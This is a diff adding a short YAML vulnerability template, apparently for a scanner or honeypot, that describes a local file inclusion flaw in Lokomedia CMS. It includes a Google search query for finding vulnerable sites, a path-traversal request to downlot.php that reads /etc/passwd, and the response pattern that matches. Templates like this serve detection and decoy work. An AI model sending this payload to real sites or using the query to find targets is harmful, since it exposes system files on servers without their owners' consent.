@@ -1,0 +1,26 @@
+id: lokomedia-cms-lfi
+info:
+  name: Lokomedia CMS - LFI Vulnerability
+  author: r3Y3r53
+  description: A Local File Inclusion (LFI) vulnerability is a type of security vulnerability
+    that occurs when a web application allows an attacker to include files on the
+    server that should not be accessible.
+  severity: high
+  reference:
+  - https://cxsecurity.com/issue/WLB-2018070116
+  - https://github.com/kangkuswae/CMS-Lokomedia
+  metadata:
+    verified: true
+    max-request: 1
+    google-query: inurl:/semua-download.html
+  tags: lfi,lokomedia,cms
+traps:
+- request:
+    method: GET
+    path: /downlot.php?file=../../../../../../../../../../etc/passwd
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: 'root:.*:0:0:'
